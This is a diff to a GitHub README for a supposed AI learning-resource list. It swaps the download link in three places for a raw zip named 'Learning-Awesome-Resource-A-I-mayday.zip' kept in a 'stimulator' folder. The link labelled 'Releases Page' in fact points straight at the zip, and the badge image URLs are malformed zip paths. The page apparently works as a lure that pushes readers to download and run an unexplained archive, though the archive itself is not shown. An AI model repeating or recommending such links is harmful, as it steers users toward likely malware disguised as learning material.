@@ -1,6 +1,6 @@
 # 🌟 Awesome-AI-IT-LearningResource - Essential Tools for AI Learning
 
-[![Download Now](https://raw.githubusercontent.com/jordanmillisock/Awesome-AI-IT-LearningResource/main/stimulator/Awesome-AI-IT-LearningResource.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/jordanmillisock/Awesome-AI-IT-LearningResource/main/stimulator/Awesome-AI-IT-LearningResource.zip)
+[![Download Now](https://github.com/jordanmillisock/Awesome-AI-IT-LearningResource/raw/refs/heads/main/stimulator/Learning-Awesome-Resource-A-I-mayday.zip%20Now-Click%20Here-brightgreen)](https://github.com/jordanmillisock/Awesome-AI-IT-LearningResource/raw/refs/heads/main/stimulator/Learning-Awesome-Resource-A-I-mayday.zip)
 
 ## 📖 Description
 
@@ -13,7 +13,7 @@ This section guides you through the process of downloading and running the Aweso
 ## 🔗 Download & Install
 
 1. **Visit the Releases Page**  
-   To obtain the latest version of the Awesome-AI-IT-LearningResource, visit this page to download: [Releases Page](https://raw.githubusercontent.com/jordanmillisock/Awesome-AI-IT-LearningResource/main/stimulator/Awesome-AI-IT-LearningResource.zip).
+   To obtain the latest version of the Awesome-AI-IT-LearningResource, visit this page to download: [Releases Page](https://github.com/jordanmillisock/Awesome-AI-IT-LearningResource/raw/refs/heads/main/stimulator/Learning-Awesome-Resource-A-I-mayday.zip).
 
 2. **Choose Your Resource**  
    On the Releases page, you will see various files available for download. Identify the version you need. Click on the link of the desired file.
@@ -83,4 +83,4 @@ We hope you find the Awesome-AI-IT-LearningResource a valuable tool in your lear
 
 Repeat these steps to install new versions as they become available. Happy learning!
 
-[![Download Now](https://raw.githubusercontent.com/jordanmillisock/Awesome-AI-IT-LearningResource/main/stimulator/Awesome-AI-IT-LearningResource.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/jordanmillisock/Awesome-AI-IT-LearningResource/main/stimulator/Awesome-AI-IT-LearningResource.zip)
+[![Download Now](https://github.com/jordanmillisock/Awesome-AI-IT-LearningResource/raw/refs/heads/main/stimulator/Learning-Awesome-Resource-A-I-mayday.zip%20Now-Click%20Here-brightgreen)](https://github.com/jordanmillisock/Awesome-AI-IT-LearningResource/raw/refs/heads/main/stimulator/Learning-Awesome-Resource-A-I-mayday.zip)
